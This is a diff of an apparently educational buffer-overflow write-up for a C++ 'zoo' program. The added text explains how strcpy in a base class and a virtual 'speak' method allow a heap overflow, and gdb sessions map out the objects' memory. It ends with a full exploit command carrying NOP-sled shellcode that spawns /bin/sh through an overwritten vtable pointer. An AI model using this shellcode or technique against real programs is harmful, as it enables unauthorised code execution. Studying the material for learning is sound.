@@ -201,7 +201,14 @@ ___
 
 Using the methods described in the previous programs we conclude that neither of the previously mensioned defence mechanism are enabled for this program, so we dive right away to our attack.
 
-###### Attack plan
+###### Determine strategy for attack
+As we notice in the code the are to classes `Cow` and `Fox` that both inherit from the base class `Animal`. This base class is pretty simple: it has only one attribute, called `name` which is a char array of length 256. Also there are three methods: the two are getting and setting the `name` attribute and the third one which is virtual, the `speak` method.
+There are two interesting things in the base class enabling a succesfull attack:
+* The method `set_name` to assign a name to the animal uses the function `strcpy` to copy a buffer to the `name` attribute. This is obliously the place to overflow the `name` buffer.
+* The method `speak` is virtual, which is enough reason to consider using it for the attack. A virtual method is assigned to an object at run time. This means that when the objects are created a dynamic binding is created to calculate the address from where the function will be called.
+
+###### Exploring and sketching the memory
+Let's jump into our - familiar by now - gdb environment
 ```
 (gdb) disas main
 Dump of assembler code for function main(int, char**):
@@ -223,28 +230,16 @@ Dump of assembler code for function main(int, char**):
    0x08048aa3 <+354>:	ret  
 
 
-
-+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 (gdb) b *0x08048976
 Breakpoint 1 at 0x8048976: file zoo.cpp, line 83.
 (gdb) b *0x08048990
 Breakpoint 2 at 0x8048990: file zoo.cpp, line 84.
 (gdb) b *0x08048a0b
 Breakpoint 3 at 0x8048a0b: file zoo.cpp, line 102.
-(gdb) r
-Starting program: /home/masteruser/zoo 
-Usage: zoo [options]
-Options:
-	-c <name> : Set cow name
-	-f <name> : Set fox name
-	-s : Instruct animals to speak
-	-h : Print options
-[Inferior 1 (process 2719) exited with code 01]
 (gdb) run -c 'a' -f 'b' -s 'a' -h 1
 Starting program: /home/masteruser/zoo -c 'a' -f 'b' -s 'a' -h 1
 
 Breakpoint 1, 0x08048976 in main (argc=9, argv=0xbffff624) at zoo.cpp:83
-warning: Source file is more recent than executable.
 83	  a1 = new Cow;
 (gdb) i r eax ebx
 eax            0x804a008	134520840
@@ -257,13 +252,13 @@ Breakpoint 2, 0x08048990 in main (argc=9, argv=0xbffff624) at zoo.cpp:84
 (gdb) i r eax ebx
 eax            0x804a110	134521104
 ebx            0x804a110	134521104
-
-++++++++++++++++++++++++++++++++++
-
+```
+___
+Let's look in a more traditional way and follow the links
+```
 (gdb) run -f $(perl -e 'print "AAAA"."BBBB"."C"x244 . "XXXX"') -c $(perl -e 'print "DDDD"."EEEE"."X"x244 . "FFFF"') -s 1
 
-(gdb) b main
- s s s
+(gdb) break main
 (gdb) p &a2
 $1 = (Animal **) 0xbffff384
 (gdb) p a2
@@ -285,9 +280,6 @@ $4 = (Animal *) 0x804a008
 (gdb) x/w 0x0804886c
 0x804886c <Cow::speak()>:	0x83e58955
 
-+++++++++++++++++++++++++++++++++++++++++ 
-
-
 (gdb) x/68x 0x804a110
 0x804a110:	0x08048d10	0x41414141	0x42424242	0x43434343
 0x804a120:	0x43434343	0x43434343	0x43434343	0x43434343
@@ -306,6 +298,7 @@ $4 = (Animal *) 0x804a008
 0x804a1f0:	0x43434343	0x43434343	0x43434343	0x43434343
 0x804a200:	0x43434343	0x43434343	0x43434343	0x43434343
 0x804a210:	0x58585858	0x00020d00	0x00000000	0x00000000
+
 (gdb) x/68x 0x804a008
 0x804a008:	0x08048d20	0x44444444	0x45454545	0x58585858
 0x804a018:	0x58585858	0x58585858	0x58585858	0x58585858
@@ -324,13 +317,16 @@ $4 = (Animal *) 0x804a008
 0x804a0e8:	0x58585858	0x58585858	0x58585858	0x58585858
 0x804a0f8:	0x58585858	0x58585858	0x58585858	0x58585858
 0x804a108:	0x46464646	0x00000100	0x08048d10	0x41414141
-(gdb) 
+```
+So now we can sketch the memory:
+<img src="https://github.com/igavriil/buffer-overflow/blob/master/master.png" width="500" height="450" />
+
+###### Preparing the attacks
+<img src="https://github.com/igavriil/buffer-overflow/blob/master/master_attack.png" width="500" height="360" />
 
 
 
-
-
+```
 ./zoo -f bob -c $(perl -e print'"\x70\xa0\x04\x08" . "\x90"x211 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x0c\xa0\x04\x08"') -s 1
 ```
-<img src="https://github.com/igavriil/buffer-overflow/blob/master/master.png" width="500" height="450" />
 
